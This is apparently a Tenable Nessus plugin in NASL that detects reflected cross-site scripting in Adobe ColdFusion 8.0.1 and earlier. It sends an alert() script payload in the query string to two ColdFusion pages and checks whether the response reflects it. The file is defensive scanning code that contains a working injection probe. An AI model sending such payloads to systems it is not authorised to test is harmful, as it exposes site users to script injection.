#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(42340);
  script_version("$Revision: 1.12 $");
  script_cvs_date("$Date: 2016/10/07 13:30:47 $");

  script_cve_id("CVE-2009-1872", "CVE-2009-1875");
  script_bugtraq_id(36046, 36053);
  script_osvdb_id(57183, 57188);
  script_xref(name:"Secunia", value:"36329");
  script_xref(name:"EDB-ID", value:"33169");

  script_name(english:"Adobe ColdFusion <= 8.0.1 _logintowizard.cfm XSS");
  script_summary(english:"Attempts a non-persistent XSS attack.");

  script_set_attribute(attribute:"synopsis", value:
"An application running on the remote web server is affected by a
cross-site scripting vulnerability.");
  script_set_attribute( attribute:"description", value:
"The version of ColdFusion running on the remote host is affected by a
cross-site scripting vulnerability. The '_logintowizard.cfm' and
'index.cfm' scripts do not sanitize the query string of the URL, which
can result in the injection of arbitrary HTML or script code. A remote
attacker can exploit this by enticing a user into requesting a
malicious URL.

Note that ColdFusion is reportedly affected by additional cross-site
scripting vulnerabilities; however, Nessus has not checked for those
issues.");
  # https://web.archive.org/web/20090821200448/http://www.dsecrg.com/pages/vul/show.php?id=122
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?38df6ade");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2009/Aug/128");
  script_set_attribute(attribute:"see_also", value:"http://www.adobe.com/support/security/bulletins/apsb09-12.html");
  script_set_attribute(attribute:"solution", value:"Apply the relevant hotfixes referenced in the vendor's advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(79);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/08/17");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/08/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2009/11/02");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:adobe:coldfusion");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("coldfusion_detect.nasl");
  script_require_ports("Services/www", 80, 8500);
  script_require_keys("installed_sw/ColdFusion");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = 'ColdFusion';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

xss = '>"><script>alert("'+SCRIPT_NAME -".nasl"+"-"+unixtime()+ '")</script>';

# Key - affected page
# Value - trailing context to detect successful injection
attempts = make_array(
  '/wizards/common/_logintowizard.cfm',
  '" method="POST" onsubmit="return _CF_checkloginform(this)">',
  '/administrator/index.cfm',
  '">'
);

# Try an XSS attack on each page
vuln_urls = make_list();

foreach page (keys(attempts))
{
  url = dir + page + '?' + xss;
  expected_output = url + attempts[page];
  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

  if (expected_output >< res[2]) vuln_urls = make_list(vuln_urls, url);

  # If this attack succeeded, only keep checking if thorough tests are enabled
  if (!thorough_tests && max_index(vuln_urls) > 0) break;
}

# Report on any XSS found
if (max_index(vuln_urls) > 0)
{
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

  if (report_verbosity > 0)
  {
    if (max_index(vuln_urls) == 1)
      trailer = '\nNote that this proof-of-concept attack';
    else
      trailer = '\nNote that these proof-of-concept attacks';

    trailer += ' will not work with all browsers.\n';
    report = get_vuln_report(items:vuln_urls, trailer:trailer, port:port);

    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
